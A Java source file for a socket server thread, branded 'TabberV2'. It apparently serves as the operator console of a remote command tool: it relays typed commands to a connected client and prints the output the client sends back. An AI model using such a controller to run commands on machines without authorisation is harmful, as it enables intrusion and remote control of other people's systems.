package Server;

import java.io.*;
import java.net.Socket;

public class EchoThread extends Thread {
    protected Socket socket;
    private static final String ANSI_BRIGHT_BLUE = "\u001B[94m";
    private static final String ANSI_RESET = "\u001B[0m";
    private static final String ANSI_CYAN = "\u001B[36m";


    public EchoThread(Socket clientSocket) {
        this.socket = clientSocket;
    }

    public void run() {
        BufferedReader cmdInput;
        BufferedReader receive;
        PrintWriter send;
        try {
            cmdInput = new BufferedReader(new InputStreamReader(System.in));
            receive = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            send = new PrintWriter(socket.getOutputStream(), true);
            System.out.println("""
                     _____     _     _               _   _  _____\s
                    |_   _|   | |   | |             | | | |/ __  \\
                      | | __ _| |__ | |__   ___ _ __| | | |`' / /'
                      | |/ _` | '_ \\| '_ \\ / _ \\ '__| | | |  / / \s
                      | | (_| | |_) | |_) |  __/ |  \\ \\_/ /./ /___
                      \\_/\\__,_|_.__/|_.__/ \\___|_|   \\___/ \\_____/
                                                                 \s
                                                                 \s""");
            System.out.println("By: InvisibleCat#0001");
            System.out.println("Server started on port: " + ANSI_CYAN + socket.getLocalPort() + ANSI_RESET);
            System.out.println("Connected to: " + ANSI_CYAN + socket.getInetAddress().toString().replaceAll("/", "") + ANSI_RESET);
            System.out.println("Type 'help' for a list of commands");


            while (true) {
                System.out.println(ANSI_CYAN + "[I] " + "Enter a cmd...");
                System.out.print(ANSI_BRIGHT_BLUE + "[C] " + ANSI_RESET);
                String command = cmdInput.readLine();
                if (!command.equalsIgnoreCase("exit")) {
                    send.println(command);
                    //System.out.println(cmdInput.readLine());
                    send.flush();
                    String response = "";
                    while (!response.equals("done")) {
                        if (!response.equals("")) {
                            System.out.println(response);
                        }
                        response = receive.readLine();
                    }


                    //Thread.sleep(1000);
                } else {
                    send.println("exit");
                    System.out.println("Shutting down server and client");
                    socket.close();
                    System.exit(0);
                    return;
                }
            }
        } catch (IOException ignored) {
        }
        System.out.println("Done");
    }
}